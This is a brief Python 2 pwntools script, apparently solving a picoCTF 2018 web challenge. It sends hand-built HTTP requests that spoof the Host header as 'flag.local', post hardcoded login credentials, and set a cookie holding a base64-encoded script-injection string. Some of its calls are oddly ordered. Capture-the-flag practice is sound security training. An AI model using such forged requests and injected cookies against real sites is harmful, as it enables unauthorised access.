from pwn import *
import time


r = remote("2018shell1.picoctf.com", 26431)
r.interactive()
payload = ""
payload += "GET /login HTTP/1.1\n"
payload += "Host: flag.local\n"
payload += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\n"
payload += "\n\n"
r.send(payload)
data = r.recv(1024)
print data

r = remote("2018shell1.picoctf.com", 26431)
r.interactive()
time.sleep(0.2)
payload = ""
payload += "POST /login HTTP/1.1\n"
payload += "Host: flag.local\n"
payload += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\n"
payload += "Content-Type: application/x-www-form-urlencoded\n"
payload += "Content-Length: " + str(len("user=realbusinessuser&pass=potoooooooo&submit=\n\n"))+"\n\n"
payload += "user=realbusinessuser&pass=potoooooooo&submit=\n\n"
r.send(payload)

r.interactive()

r = remote("2018shell1.picoctf.com", 26431)
r.interactive()
payload = ""
payload += "GET / HTTP/1.1\n"
payload += "Host: flag.local\n"
payload += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\n"
payload += "Cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D;\n"
payload += "\n\n"
r.send(payload)
data = r.recv(1024)
print data
